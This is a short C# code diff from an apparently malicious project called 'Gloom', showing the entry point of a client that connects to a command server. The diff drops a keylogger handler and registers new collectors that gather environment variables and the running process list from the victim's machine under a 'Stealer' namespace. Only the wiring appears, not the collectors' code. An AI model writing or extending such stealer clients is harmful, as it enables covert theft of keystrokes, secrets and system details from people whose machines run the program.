@@ -1,6 +1,6 @@
-﻿using Gloom.Features.Stealer;
+﻿using Gloom.Client.Features.Stealer.InfoCollector;
 
-namespace Gloom
+namespace Gloom.Client
 {
 	internal class Program
 	{
@@ -9,7 +9,8 @@ namespace Gloom
 		static void Main(string[] args)
 		{
 			var client = new MessageClient(new Uri(CommandServer));
-			client.RegisterHandler(new KeyLogger(client));
+			client.RegisterHandler(new EnvVarsCollector(client));
+			client.RegisterHandler(new ProcessListCollector(client));
 			client.Run().Wait();
 		}
 	}
